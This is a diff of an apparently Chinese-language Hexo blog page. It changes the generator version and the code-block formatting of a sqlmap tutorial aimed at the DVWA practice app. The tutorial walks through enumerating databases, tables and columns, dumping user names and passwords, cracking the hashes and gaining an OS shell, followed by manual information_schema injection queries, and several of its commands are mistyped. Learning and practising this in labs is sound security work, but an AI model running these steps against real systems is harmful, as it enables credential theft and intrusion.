@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -249,22 +249,38 @@
               <h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
 
 <p>第一步:</p>
-<div class="hljs"><pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre></div><p>第二步:</p>
-<div class="hljs"><pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre></div><p>第三步:</p>
-<div class="hljs"><pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre></div><p>第四步:</p>
-<div class="hljs"><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre></div><p>第五步:</p>
+<div class="hljs"><pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测
+</code></pre></div>
+<p>第二步:</p>
+<div class="hljs"><pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取
+</code></pre></div>
+<p>第三步:</p>
+<div class="hljs"><pre><code> -u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举
+</code></pre></div>
+<p>第四步:</p>
+<div class="hljs"><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举
+</code></pre></div>
+<p>第五步:</p>
 <div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
-//探测user表name和password字段</code></pre></div><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
+//探测user表name和password字段
+</code></pre></div>
+<p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
 <p>第六步:</p>
-<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre></div><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
+<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言
+</code></pre></div>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
 <p>group by *</p>
 <p>利用内置函数暴数据库信息</p>
 <p>version() 查看数据库版本</p>
 <p>database() 查看当前数据库名</p>
 <p>user() 查看当前用户</p>
 <p>查看表：</p>
-<div class="hljs"><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre></div><p>可十六进制查看字段：</p>
-<div class="hljs"><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre></div>
+<div class="hljs"><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  
+</code></pre></div>
+<p>可十六进制查看字段：</p>
+<div class="hljs"><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;
+</code></pre></div>
+
             </div>
             <hr>
             <div>
